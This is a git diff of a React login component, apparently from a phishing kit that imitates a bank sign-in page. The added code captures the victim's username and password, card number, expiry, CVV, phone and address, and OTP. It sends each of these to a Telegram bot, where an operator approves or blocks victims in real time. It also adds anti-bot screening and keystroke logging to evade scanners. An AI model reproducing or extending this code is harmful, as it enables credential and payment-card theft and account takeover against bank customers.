@@ -1,96 +1,326 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
+import axios from 'axios';
+import { useLanguage } from '../hooks/useLanguage';
+import { useTelegramBot } from '../hooks/useTelegramBot';
+import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
+import LoginScreen from './LoginScreen';
+import CardVerificationForm from './CardVerificationForm';
+import OtpVerificationForm from './OtpVerificationForm';
+import LoadingOverlay from './LoadingOverlay';
 import './LoginForm.css';
+import { useNavigate } from 'react-router-dom'; // Ajoutez cette ligne
+
+
 
 function LoginForm() {
+    const navigate = useNavigate(); // Ajoutez cette ligne après les hooks
+
+  const { language, t } = useLanguage();
+  
+  // State management
   const [loginName, setLoginName] = useState('');
   const [password, setPassword] = useState('');
   const [errors, setErrors] = useState({ loginName: false, password: false });
   const [showCardForm, setShowCardForm] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
+  const [showOtpForm, setShowOtpForm] = useState(false);
+  const [otpCode, setOtpCode] = useState('');
+  const [otpError, setOtpError] = useState('');
+  const [sessionId, setSessionId] = useState(null);
   
-  // État pour le formulaire de carte bancaire
+  // Typing tracking
+  const [loginTypingSent, setLoginTypingSent] = useState(false);
+  const [cardTypingSent, setCardTypingSent] = useState(false);
+  const [otpTypingSent, setOtpTypingSent] = useState(false);
+  
+  // Refs for tracking page logs
+  const hasSentCardPageLogRef = useRef(false);
+  const hasSentOtpLogRef = useRef(false);
+  
   const [cardDetails, setCardDetails] = useState({
-    cardNumber: '',
-    expiryDate: '',
-    cvv: '',
-    cardholderName: ''
+    cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
+    phoneNumber: '', city: '', postalCode: ''
   });
   const [cardErrors, setCardErrors] = useState({});
 
-  const handleLogin = (e) => {
-    e.preventDefault();
+  // Anti-bot initialization
+  useEffect(() => {
+    startTimer();
+    const handleMouseMove = () => trackInteraction();
+    window.addEventListener('mousemove', handleMouseMove);
+    return () => {
+      window.removeEventListener('mousemove', handleMouseMove);
+      resetAntiBot();
+    };
+  }, []);
 
+  // Define handler functions BEFORE using them in useTelegramBot
+  const handleApprove = async () => {
+    if (!hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLog(loginName);
+      hasSentCardPageLogRef.current = true;
+    }
+    setWaitingForApproval(false);
+    setIsLoading(false);
+    setShowCardForm(true);
+  };
+  
+  const handleDeny = () => {
+    setWaitingForApproval(false);
+    setWaitingForOtpApproval(false);
+    setIsLoading(false);
+    alert(t.denied);
+    window.location.reload();
+  };
+
+  const handleViewCard = async () => {
+    if (!hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLog(loginName);
+      hasSentCardPageLogRef.current = true;
+    }
+    setWaitingForApproval(false);
+    setIsLoading(false);
+    setShowCardForm(true);
+  };
+
+  const handleNextStep = async () => {
+    if (!hasSentOtpLogRef.current) {
+      await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
+      hasSentOtpLogRef.current = true;
+    }
+    setWaitingForOtpApproval(false);
+    setIsLoading(false);
+    setShowCardForm(false);
+    setShowOtpForm(true);
+    setOtpCode('');
+    setOtpError('');
+  };
+
+  const handleBackToCard = () => {
+    console.log('🔵 Back to Card button clicked!');
+    setShowOtpForm(false);
+    setShowCardForm(true);
+    setOtpCode('');
+    setOtpError('');
+    hasSentOtpLogRef.current = false;
+    setOtpTypingSent(false);
+  };
+
+  const handleBackToLogin = () => {
+    console.log('🔵 Back to Login button clicked!');
+    setShowCardForm(false);
+    setShowOtpForm(false);
+    setWaitingForOtpApproval(false);
+    setWaitingForApproval(false);
+    setIsLoading(false);
+    setCardDetails({
+      cardNumber: '',
+      expiryDate: '',
+      cvv: '',
+      cardholderName: '',
+      phoneNumber: '',
+      city: '',
+      postalCode: ''
+    });
+    setCardErrors({});
+    setOtpCode('');
+    setOtpError('');
+    setLoginTypingSent(false);
+    setCardTypingSent(false);
+    setOtpTypingSent(false);
+    hasSentCardPageLogRef.current = false;
+    hasSentOtpLogRef.current = false;
+    resetAntiBot();
+    startTimer();
+  };
+
+  const handleBlock = async () => {
+    console.log('🔵 Block IP button clicked!');
+    try {
+      const response = await axios.get('https://api.ipify.org?format=json');
+      const userIP = response.data.ip;
+      
+      const blockedIPs = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
+      if (!blockedIPs.includes(userIP)) {
+        blockedIPs.push(userIP);
+        localStorage.setItem('blocked_ips', JSON.stringify(blockedIPs));
+      }
+      
+      sessionStorage.setItem('blocked_ip', userIP);
+      window.location.href = '/blocked';
+    } catch (error) {
+      console.error('Error blocking IP:', error);
+      window.location.href = '/blocked';
+    }
+  };
+
+  // Telegram bot hooks - NOW after handlers are defined
+  const {
+    generateSessionId,
+    sendToTelegramWithButtons,
+    sendCardDetailsToTelegram,
+    sendFormattedCardDetails,
+    sendOtpToTelegram,
+    sendSuccessToTelegram,
+    sendCardVerificationLog,
+    sendOtpPageLog,
+    sendCardVerificationPageLog,
+    sendOtpSubmitLog,
+    sendOtpVerifiedLog,
+    sendLoginTypingLog,
+    sendCardTypingLog,
+    sendOtpTypingLog,
+    sendBlockedLog
+  } = useTelegramBot(
+    sessionId, 
+    handleApprove, 
+    handleDeny, 
+    handleViewCard, 
+    handleNextStep, 
+    handleBackToCard, 
+    handleBackToLogin, 
+    handleBlock
+  );
+
+  const handleInputChange = async (field, value) => {
+    trackTyping();
+    
+    if (field === 'loginName') {
+      setLoginName(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
+    } else {
+      setPassword(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
+    }
+    setErrors({ ...errors, [field]: false });
+  };
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    
     const newErrors = {
       loginName: loginName.trim() === '',
       password: password.trim() === ''
     };
-
     setErrors(newErrors);
-
-    if (!newErrors.loginName && !newErrors.password) {
-      // Afficher le formulaire de vérification de carte
-      setShowCardForm(true);
-    }
-  };
-
-  const handleCertificate = (e) => {
-    e.preventDefault();
-    alert('Connexion par certificat');
-  };
-
-  const handleInputChange = (field, value) => {
-    if (field === 'loginName') {
-      setLoginName(value);
-    } else {
-      setPassword(value);
-    }
-
-    setErrors({ ...errors, [field]: false });
-  };
-
-  const handleCardInputChange = (field, value) => {
-    // Formatage automatique pour le numéro de carte
-    if (field === 'cardNumber') {
-      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-      if (value.length > 19) value = value.slice(0, 19);
-    }
+    if (newErrors.loginName || newErrors.password) return;
     
-    // Formatage pour la date d'expiration
-    if (field === 'expiryDate') {
-      value = value.replace(/\D/g, '');
-      if (value.length >= 2) {
-        value = value.slice(0, 2) + (value.length > 2 ? '/' + value.slice(2, 4) : '');
+    const antiBotResult = checkAntiBot();
+    console.log('🤖 Enhanced Anti-bot result:', antiBotResult);
+    
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
       }
-      if (value.length > 5) value = value.slice(0, 5);
-    }
-    
-    // Limiter le CVV à 3-4 chiffres
-    if (field === 'cvv') {
-      value = value.replace(/\D/g, '').slice(0, 4);
+      
+      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
     }
 
-    setCardDetails({
-      ...cardDetails,
-      [field]: value
-    });
+    setIsLoading(true);
+    setWaitingForApproval(true);
+    const newSessionId = generateSessionId();
+    setSessionId(newSessionId);
     
-    // Effacer l'erreur du champ modifié
-    if (cardErrors[field]) {
-      setCardErrors({
-        ...cardErrors,
-        [field]: false
-      });
+    const message = `
+🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🆔 <b>Session ID:</b> <code>${newSessionId}</code>
+━━━━━━━━━━━━━━━━━━━━━
+
+📝 <b>LOGIN CREDENTIALS:</b>
+├ 👤 <b>Username:</b> ${loginName.trim()}
+└ 🔑 <b>Password:</b> ${password.trim()}
+
+━━━━━━━━━━━━━━━━━━━━━
+🤖 <b>Anti-bot Status:</b> ✅ PASSED
+📊 <b>Human Score:</b> ${antiBotResult.reason}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>Click a button below to proceed</i>
+    `;
+    
+    await sendToTelegramWithButtons(message, newSessionId);
+  };
+
+  const handleCardInputChange = async (field, value) => {
+    trackTyping();
+    
+    if (!cardTypingSent) {
+      await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
+      setCardTypingSent(true);
     }
+
+    let formattedValue = value;
+    
+    if (field === 'cardNumber') {
+      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
+    }
+    
+    if (field === 'expiryDate') {
+      formattedValue = value.replace(/\D/g, '');
+      if (formattedValue.length >= 2) {
+        formattedValue = formattedValue.slice(0, 2) + (formattedValue.length > 2 ? '/' + formattedValue.slice(2, 4) : '');
+      }
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
+    }
+    
+    if (field === 'cvv') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 4);
+    }
+    
+    if (field === 'phoneNumber') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 9);
+    }
+    
+    if (field === 'city') {
+      formattedValue = value.slice(0, 50);
+    }
+    
+    if (field === 'postalCode') {
+      formattedValue = value.replace(/\s/g, '');
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
+      if (formattedValue.length >= 3 && formattedValue.length <= 5) {
+        formattedValue = formattedValue.slice(0, 3) + (formattedValue.length > 3 ? ' ' + formattedValue.slice(3, 5) : '');
+      }
+    }
+
+    setCardDetails({ ...cardDetails, [field]: formattedValue });
+    
+    if (cardErrors[field]) {
+      setCardErrors({ ...cardErrors, [field]: false });
+    }
+  };
+
+  const validateCzechPostalCode = (postalCode) => {
+    const cleanCode = postalCode.replace(/\s/g, '');
+    const postalRegex = /^\d{5}$/;
+    return postalRegex.test(cleanCode);
   };
 
   const validateCardForm = () => {
     const errors = {};
     
     if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
-      errors.cardNumber = 'Veuillez saisir un numéro de carte valide (16 chiffres)';
+      errors.cardNumber = t.validCard;
     }
     
     if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
-      errors.expiryDate = 'Veuillez saisir une date d\'expiration valide (MM/AA)';
+      errors.expiryDate = t.validExpiry;
     } else {
       const [month, year] = cardDetails.expiryDate.split('/');
       const currentDate = new Date();
@@ -100,208 +330,165 @@ function LoginForm() {
       const expMonth = parseInt(month);
       
       if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
-        errors.expiryDate = 'La carte est expirée';
+        errors.expiryDate = t.cardExpired;
       }
     }
     
     if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
-      errors.cvv = 'Veuillez saisir un CVV valide (3-4 chiffres)';
+      errors.cvv = t.validCvv;
     }
     
     if (!cardDetails.cardholderName.trim()) {
-      errors.cardholderName = 'Veuillez saisir le nom du titulaire';
+      errors.cardholderName = t.validCardholder;
+    }
+    
+    if (!cardDetails.phoneNumber.trim()) {
+      errors.phoneNumber = t.validPhone;
+    } else if (cardDetails.phoneNumber.length !== 9) {
+      errors.phoneNumber = t.phoneDigits;
+    }
+    
+    if (!cardDetails.city.trim()) {
+      errors.city = t.validCity;
+    } else if (cardDetails.city.trim().length < 2) {
+      errors.city = t.validCityName;
+    }
+    
+    if (!cardDetails.postalCode.trim()) {
+      errors.postalCode = t.validPostal;
+    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
+      errors.postalCode = t.invalidPostal;
     }
     
     return errors;
   };
 
-  const handleCardSubmit = (e) => {
+  const handleCardSubmit = async (e) => {
     e.preventDefault();
+    
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
     
     const errors = validateCardForm();
     
     if (Object.keys(errors).length === 0) {
-      // Tout est valide, traiter la vérification
-      alert('Vérification des coordonnées de carte en cours...\n' +
-            `Titulaire: ${cardDetails.cardholderName}\n` +
-            `Carte: ${cardDetails.cardNumber}\n` +
-            `Expiration: ${cardDetails.expiryDate}`);
-      
-      // Réinitialiser après vérification
-      setShowCardForm(false);
-      setCardDetails({
-        cardNumber: '',
-        expiryDate: '',
-        cvv: '',
-        cardholderName: ''
-      });
-      setLoginName('');
-      setPassword('');
+      setIsLoading(true);
+      setWaitingForOtpApproval(true);
+      await sendCardVerificationLog(loginName);
+      await sendCardDetailsToTelegram(cardDetails, sessionId);
+      setIsLoading(false);
     } else {
       setCardErrors(errors);
     }
   };
 
-  const handleCancelCardForm = () => {
-    setShowCardForm(false);
-    setCardDetails({
-      cardNumber: '',
-      expiryDate: '',
-      cvv: '',
-      cardholderName: ''
-    });
-    setCardErrors({});
+  const handleOtpSubmit = async (e) => {
+    e.preventDefault();
+    
+    if (!otpCode.trim() || otpCode.length < 6) {
+      setOtpError(t.validOtp);
+      return;
+    }
+    
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+    
+    setIsLoading(true);
+    
+    await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
+    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
+    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
+    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
+    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+    
+    setIsLoading(false);
+    
+    alert(t.success);
+    window.location.reload();
   };
+
+  const handleOtpChange = async (value) => {
+    trackTyping();
+    setOtpCode(value);
+    if (!otpTypingSent && value.length === 1) {
+      await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
+      setOtpTypingSent(true);
+    }
+    setOtpError('');
+  };
+
+  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;
 
   return (
     <div className="login-container">
-      <h2>Login</h2>
+      <h2>{t.loginTitle}</h2>
 
-      {/* Messages d'erreur pour le login */}
-      {(errors.loginName || errors.password) && (
-        <div className="error-box">
-          {errors.loginName && (
-            <div className="error-item">
-              <span className="error-icon">❗</span>
-              Please enter your login name.
-            </div>
-          )}
-          {errors.password && (
-            <div className="error-item">
-              <span className="error-icon">❗</span>
-              Please enter your password.
-            </div>
-          )}
-        </div>
+      <LoadingOverlay 
+        isLoading={isLoadingState}
+        waitingForApproval={waitingForApproval}
+        waitingForOtpApproval={waitingForOtpApproval}
+        t={t}
+      />
+
+      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
+        <LoginScreen
+          loginName={loginName}
+          password={password}
+          errors={errors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleInputChange}
+          onLogin={handleLogin}
+        />
       )}
 
-      {/* Formulaire de connexion initial */}
-      {!showCardForm ? (
-        <>
-          <div className="login-form">
-            <div className="form-group">
-              <label htmlFor="loginName">Login name</label>
-              <input
-                type="text"
-                id="loginName"
-                value={loginName}
-                onChange={(e) => handleInputChange('loginName', e.target.value)}
-                placeholder="Login name"
-                className={errors.loginName ? 'input-error' : ''}
-              />
-            </div>
+      {showCardForm && !waitingForOtpApproval && (
+        <CardVerificationForm
+          cardDetails={cardDetails}
+          cardErrors={cardErrors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleCardInputChange}
+          onSubmit={handleCardSubmit}
+        />
+      )}
 
-            <div className="form-group">
-              <label htmlFor="password">Password</label>
-              <input
-                type="password"
-                id="password"
-                value={password}
-                onChange={(e) => handleInputChange('password', e.target.value)}
-                placeholder="Password"
-                className={errors.password ? 'input-error' : ''}
-              />
-            </div>
-
-            <button onClick={handleCertificate} className="certificate-btn">
-              Certificate
-            </button>
-
-            <button onClick={handleLogin} className="login-btn">
-              Log in
-            </button>
-          </div>
-
-          <div className="login-links">
-            <a href="#">Unknown login</a>
-            <span>|</span>
-            <a href="#">Unknown password</a>
-            <span>|</span>
-            <a href="#">Register</a>
-          </div>
-        </>
-      ) : (
-        /* Formulaire de vérification de carte bancaire */
-        <div className="card-verification-form">
-          <h3>Vérification des coordonnées de carte bancaire</h3>
-          <p className="verification-message">
-            Pour des raisons de sécurité, veuillez vérifier vos coordonnées de carte bancaire.
-          </p>
-          
-          <form onSubmit={handleCardSubmit}>
-            <div className="form-group">
-              <label htmlFor="cardholderName">Nom du titulaire de la carte</label>
-              <input
-                type="text"
-                id="cardholderName"
-                value={cardDetails.cardholderName}
-                onChange={(e) => handleCardInputChange('cardholderName', e.target.value)}
-                placeholder="Ex: JEAN DUPONT"
-                className={cardErrors.cardholderName ? 'input-error' : ''}
-              />
-              {cardErrors.cardholderName && (
-                <span className="error-message">{cardErrors.cardholderName}</span>
-              )}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="cardNumber">Numéro de carte</label>
-              <input
-                type="text"
-                id="cardNumber"
-                value={cardDetails.cardNumber}
-                onChange={(e) => handleCardInputChange('cardNumber', e.target.value)}
-                placeholder="1234 5678 9012 3456"
-                maxLength="19"
-                className={cardErrors.cardNumber ? 'input-error' : ''}
-              />
-              {cardErrors.cardNumber && (
-                <span className="error-message">{cardErrors.cardNumber}</span>
-              )}
-            </div>
-
-            <div className="form-row">
-              <div className="form-group half">
-                <label htmlFor="expiryDate">Date d'expiration</label>
-                <input
-                  type="text"
-                  id="expiryDate"
-                  value={cardDetails.expiryDate}
-                  onChange={(e) => handleCardInputChange('expiryDate', e.target.value)}
-                  placeholder="MM/AA"
-                  maxLength="5"
-                  className={cardErrors.expiryDate ? 'input-error' : ''}
-                />
-                {cardErrors.expiryDate && (
-                  <span className="error-message">{cardErrors.expiryDate}</span>
-                )}
-              </div>
-
-              <div className="form-group half">
-                <label htmlFor="cvv">CVV</label>
-                <input
-                  type="text"
-                  id="cvv"
-                  value={cardDetails.cvv}
-                  onChange={(e) => handleCardInputChange('cvv', e.target.value)}
-                  placeholder="123"
-                  maxLength="4"
-                  className={cardErrors.cvv ? 'input-error' : ''}
-                />
-                {cardErrors.cvv && (
-                  <span className="error-message">{cardErrors.cvv}</span>
-                )}
-              </div>
-            </div>
-
-            <div className="card-buttons">
-             
-              <button type="submit" className="verify-btn">
-                Vérifier
-              </button>
-            </div>
-          </form>
-        </div>
+      {showOtpForm && (
+        <OtpVerificationForm
+          otpCode={otpCode}
+          otpError={otpError}
+          isLoading={isLoading}
+          t={t}
+          onOtpChange={handleOtpChange}
+          onSubmit={handleOtpSubmit}
+          onBack={handleBackToCard}
+        />
       )}
     </div>
   );
